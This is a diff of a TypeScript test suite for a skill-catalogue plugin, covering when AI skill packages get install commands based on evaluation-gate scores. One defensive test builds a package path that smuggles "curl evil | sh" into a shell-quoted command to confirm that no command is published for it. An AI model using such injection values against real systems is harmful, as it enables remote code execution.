@@ -5,9 +5,12 @@ import {
   ANNOTATION_EVAL_SCORE_REF,
   ANNOTATION_SOURCE_LOCATION,
   readEvalScore,
+  scoreState,
   readInstallCommands,
   isInstallable,
 } from '@internal/plugin-skill-hub-common';
+import { readFileSync } from 'fs';
+import { join } from 'path';
 import { RepoRef, TreeEntry } from '../github/GithubAssetReader';
 import { buildEntities, publishedPaths } from './entities';
 import { parseManifest } from './manifest';
@@ -118,11 +121,9 @@ publish:
 
     const skill = entities[0];
     expect(isInstallable(skill)).toBe(false);
-    // A command still exists: the gate is the score, not the absence of a
-    // command, and the panel needs something to show once it is scored.
-    expect(readInstallCommands(skill).claude).toContain(
-      `ainb skill install 'gh:wololo-labs/estate@${SHA}/skills/lonely'`,
-    );
+    // The gate is enforced here, not only in the UI: no passing score, no
+    // command to copy.
+    expect(readInstallCommands(skill)).toEqual({});
   });
 
   it('gives a pack its score and gives its members the same score and command', async () => {
@@ -246,6 +247,278 @@ publish:
     });
   });
 
+  it('keeps a measurably worse asset uninstallable when its score came from eval-score.json', async () => {
+    const { entities } = await buildEntities({
+      repo: REPO,
+      commitSha: SHA,
+      manifest: parseManifest(
+        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+      ),
+      ...repository({
+        'packages/p/apm.yml': 'name: p\n',
+        'packages/p/eval-score.json': JSON.stringify({
+          verdict: 'PASS',
+          stats: { significant_regression: true },
+        }),
+      }),
+    });
+    expect(scoreState(readEvalScore(entities[0]))).toBe('regressed');
+    expect(isInstallable(entities[0])).toBe(false);
+  });
+
+  describe('only a gate report can show a gain', () => {
+    const stateOf = async (files: Record<string, string>) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          ...files,
+        }),
+      });
+      const score = readEvalScore(entities[0])!;
+      return { state: scoreState(score), origin: score.origin };
+    };
+    const claim = { verdict: 'PASS', stats: { significant_improvement: true } };
+
+    it('records a no-skill baseline only when the report says so', async () => {
+      const kind = async (extra: object) => {
+        const { entities } = await buildEntities({
+          repo: REPO,
+          commitSha: SHA,
+          manifest: parseManifest(
+            'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+          ),
+          ...repository({
+            'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+            'packages/p/eval-gate-report.json': JSON.stringify({
+              verdict: 'pass',
+              signals: [],
+              ...extra,
+            }),
+          }),
+        });
+        return readEvalScore(entities[0])!.baselineKind;
+      };
+      expect(await kind({ baseline_kind: 'no-skill' })).toBe('no-skill');
+      expect(await kind({})).toBeUndefined();
+      expect(await kind({ baseline_kind: 'previous-release' })).toBeUndefined();
+    });
+
+    it('reads a gain from a gate report', async () => {
+      expect(
+        await stateOf({
+          'packages/p/eval-gate-report.json': JSON.stringify({
+            verdict: 'pass',
+            signals: [],
+            stats: { significant_improvement: true },
+          }),
+        }),
+      ).toEqual({ state: 'gain', origin: 'gate-report' });
+    });
+
+    it('caps a gain claimed in a hand-written eval-score.json at no gain', async () => {
+      expect(
+        await stateOf({ 'packages/p/eval-score.json': JSON.stringify(claim) }),
+      ).toEqual({ state: 'no-gain', origin: 'eval-score' });
+    });
+
+    it('caps a gain claimed in a catalogue file at no gain, whatever origin it writes for itself', async () => {
+      const catalogInfo = [
+        'apiVersion: backstage.io/v1alpha1',
+        'kind: System',
+        'metadata:',
+        '  name: p',
+        '  annotations:',
+        `    ${ANNOTATION_EVAL_SCORE}: '${JSON.stringify({ ...claim, origin: 'gate-report' })}'`,
+        'spec:',
+        '  owner: user:x',
+      ].join('\n');
+      expect(
+        await stateOf({ 'packages/p/catalog-info.yaml': catalogInfo }),
+      ).toEqual({ state: 'no-gain', origin: 'catalogue' });
+    });
+  });
+
+  describe('which scores get an install command at all', () => {
+    const commandsFor = async (report?: object) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n  skills: packages/*/.apm/skills/*/SKILL.md\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          'packages/p/.apm/skills/s/SKILL.md': '---\ndescription: d\n---\n',
+          ...(report
+            ? { 'packages/p/eval-gate-report.json': JSON.stringify(report) }
+            : {}),
+        }),
+      });
+      return [find(entities, 'System', 'p')!, find(entities, 'AiResource', 's')!].map(
+        e => readInstallCommands(e),
+      );
+    };
+
+    it.each([
+      ['a regression', { verdict: 'regression', signals: [] }],
+      ['a failed gate', { verdict: 'refused', signals: [] }],
+      ['no report at all', undefined],
+    ])('publishes no command for %s, so the block is not only in the UI', async (_, report) => {
+      for (const commands of await commandsFor(report)) {
+        expect(commands).toEqual({});
+      }
+    });
+
+    it.each([
+      ['a pass with no gain', { verdict: 'pass', signals: [] }],
+      ['a measured gain', { verdict: 'pass', signals: [], stats: { significant_improvement: true } }],
+    ])('publishes the commands for %s', async (_, report) => {
+      for (const commands of await commandsFor(report)) {
+        expect(Object.keys(commands)).toContain('claude');
+      }
+    });
+  });
+
+  describe('the commit a score was measured at', () => {
+    const measuredAs = async (commit: string) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          'packages/p/eval-gate-report.json': JSON.stringify({
+            verdict: 'pass',
+            signals: [],
+            subject: { commit },
+          }),
+        }),
+      });
+      return readEvalScore(entities[0])!.measuredCommit;
+    };
+
+    it('lower cases an upper case sha instead of dropping it', async () => {
+      expect(await measuredAs('B'.repeat(40))).toBe('b'.repeat(40));
+    });
+
+    it('keeps a tag as written, so the score is stale and says what it was taken at', async () => {
+      expect(await measuredAs('v1.2.0')).toBe('v1.2.0');
+    });
+
+    it('keeps the tag a catalogue file was published from', async () => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          'packages/p/catalog-info.yaml': [
+            'apiVersion: backstage.io/v1alpha1',
+            'kind: System',
+            'metadata:',
+            '  name: p',
+            '  annotations:',
+            `    ${ANNOTATION_SOURCE_LOCATION}: url:https://github.com/wololo-labs/estate/tree/v1.2.0/packages/p/`,
+            `    ${ANNOTATION_EVAL_SCORE}: '{"verdict":"PASS"}'`,
+            'spec:',
+            '  owner: user:x',
+          ].join('\n'),
+        }),
+      });
+      expect(readEvalScore(entities[0])!.measuredCommit).toBe('v1.2.0');
+    });
+  });
+
+  describe('the statistics in the gate report', () => {
+    const build = async (report: string) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+        ),
+        ...repository({
+          'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\n',
+          'packages/qe-agent-pack/eval-gate-report.json': report,
+        }),
+      });
+      return entities[0];
+    };
+
+    it('reads the real test-writer-pack report as a pass with no demonstrated gain', async () => {
+      // The gate report ainb-toolkit published for packages/test-writer-pack
+      // on f/test-writer-pack, verbatim.
+      const real = readFileSync(
+        join(__dirname, '__fixtures__/test-writer-pack.eval-gate-report.json'),
+        'utf8',
+      );
+      const entity = await build(real);
+      const score = readEvalScore(entity)!;
+
+      expect(score.measuredCommit).toBe(
+        'bd06dab3518ef4da02cda155d6310de176d0e3e1',
+      );
+      expect(score.sourceVisibility).toBe('internal');
+      expect(score.stats).toMatchObject({
+        ciLow: -0.01022395119096374,
+        ciHigh: 0.010485766042045853,
+        confidence: 0.95,
+        significantImprovement: false,
+        significantRegression: false,
+      });
+      expect(scoreState(score)).toBe('no-gain');
+      expect(isInstallable(entity)).toBe(true);
+    });
+
+    it('reads a significant improvement as a gain', async () => {
+      const entity = await build(
+        JSON.stringify({
+          verdict: 'pass',
+          signals: [],
+          stats: { significant_improvement: true, ci_low: 0.02, ci_high: 0.09 },
+        }),
+      );
+      expect(scoreState(readEvalScore(entity))).toBe('gain');
+    });
+
+    it('reads a regression verdict as regressed and not installable', async () => {
+      const entity = await build(
+        JSON.stringify({ verdict: 'regression', signals: [] }),
+      );
+      expect(scoreState(readEvalScore(entity))).toBe('regressed');
+      expect(isInstallable(entity)).toBe(false);
+    });
+
+    it('does not invent a gain from a report that carries no statistics', async () => {
+      const entity = await build(
+        JSON.stringify({ verdict: 'pass', signals: [] }),
+      );
+      expect(readEvalScore(entity)!.stats).toBeUndefined();
+      expect(scoreState(readEvalScore(entity))).toBe('no-gain');
+    });
+
+    it('ignores a statistic of the wrong type rather than trusting it', async () => {
+      const entity = await build(
+        JSON.stringify({
+          verdict: 'pass',
+          signals: [],
+          stats: { significant_improvement: 'true', ci_low: 'low' },
+        }),
+      );
+      expect(readEvalScore(entity)!.stats).toBeUndefined();
+      expect(scoreState(readEvalScore(entity))).toBe('no-gain');
+    });
+  });
+
   it('keeps the install blocked when the gate did not pass', async () => {
     const report = (verdict: string) =>
       JSON.stringify({ verdict, signals: [], subject: { commit: 'd'.repeat(40) } });
@@ -287,9 +560,7 @@ publish:
     const { entities } = await buildEntities({
       repo: REPO,
       commitSha: SHA,
-      manifest: parseManifest(
-        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
-      ),
+      manifest: parseManifest('owner: team\npublish:\n  packages: packages/*/apm.yml\n'),
       ...repository({
         'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\n',
         'packages/qe-agent-pack/catalog-info.yaml': catalogInfo,
@@ -305,27 +576,28 @@ publish:
   });
 
   it('publishes no install command for a path that could break its own quoting', async () => {
+    const passing = JSON.stringify({ verdict: 'pass', signals: [] });
     const { entities } = await buildEntities({
       repo: REPO,
       commitSha: SHA,
       manifest: parseManifest(
-        "owner: team\npublish:\n  skills: 'skills/*/SKILL.md'\n",
+        "owner: team\npublish:\n  packages: 'packages/*/apm.yml'\n",
       ),
       ...repository({
-        "skills/a'; curl evil | sh; '/SKILL.md": '---\ndescription: hostile\n---\n',
-        'skills/honest/SKILL.md': '---\ndescription: fine\n---\n',
+        "packages/a'; curl evil | sh; '/apm.yml": 'name: hostile\nversion: 0.1.0\n',
+        "packages/a'; curl evil | sh; '/eval-gate-report.json": passing,
+        'packages/honest/apm.yml': 'name: fine\nversion: 0.1.0\n',
+        'packages/honest/eval-gate-report.json': passing,
       }),
     });
 
-    const hostile = entities.find(e => e.metadata.description === 'hostile')!;
+    const hostile = find(entities, 'System', 'hostile')!;
     // Browsable and readable, but nothing to paste into a shell.
     expect(hostile).toBeDefined();
     expect(readInstallCommands(hostile)).toEqual({});
-    expect(
-      readInstallCommands(
-        entities.find(e => e.metadata.description === 'fine')!,
-      ).claude,
-    ).toContain('ainb skill install');
+    expect(readInstallCommands(find(entities, 'System', 'fine')!).claude).toContain(
+      'apm install',
+    );
   });
 
   it('reports a repository with zero assets rather than losing it', async () => {
@@ -349,7 +621,9 @@ publish:
     const { entities } = await buildEntities({
       repo: REPO,
       commitSha: SHA,
-      manifest: parseManifest('owner: team\npublish:\n  packages: packages/*/apm.yml\n'),
+      manifest: parseManifest(
+        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+      ),
       ...repository({
         'packages/broken-pack/apm.yml': 'name: broken-pack\nversion: 0.1.0\n',
         'packages/broken-pack/eval-score.json': JSON.stringify({
